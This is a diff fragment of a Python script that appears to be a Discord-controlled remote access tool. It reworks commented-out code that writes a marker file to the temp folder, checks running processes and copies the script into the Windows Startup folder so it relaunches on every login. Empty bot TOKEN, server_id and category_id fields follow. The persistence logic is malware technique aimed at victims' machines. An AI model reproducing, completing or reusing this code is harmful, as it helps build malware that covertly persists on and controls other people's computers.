@@ -25,51 +25,50 @@ from uuid import uuid4
 #if ra < 2 and ca < 2:
 #    sys.exit()
 #else:
-
 temp = os.getenv('temp')
 
 # Check if prompt name is already configured & If file already exist
 # Really bad code, doesn't check if admin perms or not, same with start up path
-#appdata = os.getenv('appdata')
-#startup_path = f'{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-#if os.path.exists(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}')):
-#    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'r') as f:
-#        lines = [line.rstrip('\n') for line in f]
-#    if lines[1] and lines[1] in (p.name() for p in process_iter()):
-#        if os.getcwd() == startup_path:
+#    appdata = os.getenv('appdata')
+#    startup_path = f'{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+#    if os.path.exists(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}')):
+#        with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'r') as f:
+#            lines = [line.rstrip('\n') for line in f]
+#        if lines[1] and lines[1] in (p.name() for p in process_iter()):
+#            if os.getcwd() == startup_path:
+#                try:
+#                    prompt_name = lines[0]
+#                except Exception:
+#                    prompt_name = str(uuid4())
+#                    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
+#                        f.write(f'{prompt_name}\n')
+#                        f.write(f'{os.path.basename(sys.argv[0])}') 
+#            elif os.path.exists(os.path.join(startup_path, lines[1])):
+#                sys.exit()
+#        else:
 #            try:
 #                prompt_name = lines[0]
 #            except Exception:
 #                prompt_name = str(uuid4())
 #                with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
-#                    f.write(f'{prompt_name}\n')
-#                    f.write(f'{os.path.basename(sys.argv[0])}') 
-#        elif os.path.exists(os.path.join(startup_path, lines[1])):
-#            sys.exit()
+#                   f.write(f'{prompt_name}\n')
+#                   f.write(f'{os.path.basename(sys.argv[0])}')
 #    else:
-#        try:
-#            prompt_name = lines[0]
-#        except Exception:
-#            prompt_name = str(uuid4())
-#            with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
-#               f.write(f'{prompt_name}\n')
-#               f.write(f'{os.path.basename(sys.argv[0])}')
-#else:
-#    prompt_name = str(uuid4())
-#    with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
-#       f.write(f'{prompt_name}\n')
-#       f.write(f'{os.path.basename(sys.argv[0])}')
+#        prompt_name = str(uuid4())
+#        with open(os.path.join(temp, '{1-607-7H3-M0V35-L1J3-J4663R}'), 'w') as f:
+#           f.write(f'{prompt_name}\n')
+#           f.write(f'{os.path.basename(sys.argv[0])}')
 
 # Check if itself is in startup path or not
-#if os.path.exists(startup_path):
-    #if os.getcwd() != startup_path:
-        #if os.path.exists(os.path.join(startup_path, os.path.basename(sys.argv[0]))):
-            #pass
-        #else:
-            #shutil.copyfile(sys.argv[0], os.path.join(path, os.path.basename(sys.argv[0])))
-            #os.chdir(startup_path)
-            #os.startfile(os.path.join(path, os.path.basename(sys.argv[0])))
-    #else:
+#    if os.path.exists(startup_path):
+#        if os.getcwd() != startup_path:
+#            if os.path.exists(os.path.join(startup_path, os.path.basename(sys.argv[0]))):
+#                pass
+#            else:
+#                shutil.copyfile(sys.argv[0], os.path.join(startup_path, os.path.basename(sys.argv[0])))
+#                os.chdir(startup_path)
+#                os.startfile(os.path.join(startup_path, os.path.basename(sys.argv[0])))
+#        else:
 TOKEN = ''
 server_id = ''
 category_id = ''
